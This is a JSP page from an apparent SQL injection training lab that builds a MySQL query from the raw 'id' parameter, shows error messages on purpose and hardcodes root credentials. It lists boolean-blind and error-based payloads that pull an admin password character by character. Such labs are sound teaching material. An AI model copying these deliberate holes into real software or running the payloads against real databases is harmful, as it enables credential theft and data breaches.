<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="java.sql.*" %>
<%--
    SQL Injection Lab - ID based detail page
    Good for demonstrating:
    - Boolean-based blind SQLi
    - Error-based (if error messages are shown)
    - Stacked queries in some MySQL configurations
--%>
<%
    String DB_HOST = "jdbc:mysql://127.0.0.1:3306/sqli_lab?useSSL=false&serverTimezone=UTC";
    String DB_USER = "root";
    String DB_PASSWORD = "ntsdev";

    String id = request.getParameter("id");
    String message = "";
    String executedQuery = "";
    String userInfo = "";

    if (id != null && !id.trim().isEmpty()) {
        Connection conn = null;
        Statement stmt = null;
        ResultSet rs = null;

        try {
            Class.forName("com.mysql.jdbc.Driver");
            conn = DriverManager.getConnection(DB_HOST, DB_USER, DB_PASSWORD);
            stmt = conn.createStatement();

            executedQuery = "SELECT id, username, email, role, secret_note FROM users WHERE id = " + id;

            rs = stmt.executeQuery(executedQuery);

            if (rs.next()) {
                userInfo = "ID: " + rs.getInt("id") + "<br>" +
                           "Username: " + rs.getString("username") + "<br>" +
                           "Email: " + rs.getString("email") + "<br>" +
                           "Role: " + rs.getString("role") + "<br>" +
                           "Secret: " + rs.getString("secret_note");
            } else {
                userInfo = "해당 사용자가 없습니다.";
            }
        } catch (Exception e) {
            // Error messages are intentionally exposed (bad practice)
            message = "SQL Error: " + e.getMessage();
        } finally {
            try { if (rs != null) rs.close(); } catch (Exception ignored) {}
            try { if (stmt != null) stmt.close(); } catch (Exception ignored) {}
            try { if (conn != null) conn.close(); } catch (Exception ignored) {}
        }
    }
%>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SQLi Lab - Detail (Boolean Blind)</title>
    <style>body { font-family: monospace; max-width: 860px; margin: 40px auto; } pre { background:#1a1a1a;color:#0f0;padding:12px; } .box{background:#f8f8f8;padding:15px;border:1px solid #ccc}</style>
</head>
<body>
    <h1>Boolean-based / Error-based Blind SQLi</h1>
    <p><code>?id=1</code> 형태로 접근합니다. id 값이 숫자로 직접 들어갑니다.</p>

    <div class="box">
        <form method="get">
            User ID: <input type="text" name="id" size="20" value="<%= id != null ? id : "1" %>">
            <input type="submit" value="조회">
        </form>
    </div>

    <% if (!executedQuery.isEmpty()) { %>
        <h3>실행된 쿼리:</h3>
        <pre><%= executedQuery %></pre>
    <% } %>

    <% if (!userInfo.isEmpty()) { %>
        <div class="box"><%= userInfo %></div>
    <% } %>

    <% if (!message.isEmpty()) { %>
        <p style="color:red"><%= message %></p>
    <% } %>

    <h3>Boolean Blind 페이로드 예시 (MySQL)</h3>
    <pre>
1 AND 1=1
1 AND 1=2
1 AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 10
1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 's'
1 AND (SELECT ASCII(SUBSTRING(password,3,1)) FROM users WHERE username='admin') > 50
    </pre>

    <h3>Error-based (MySQL)</h3>
    <pre>
1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users WHERE username='admin'), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
    </pre>

    <p>
        <a href="vuln-search.jsp">← 이전</a> |
        <a href="secure-detail.jsp">Secure 버전 보기</a>
    </p>
</body>
</html>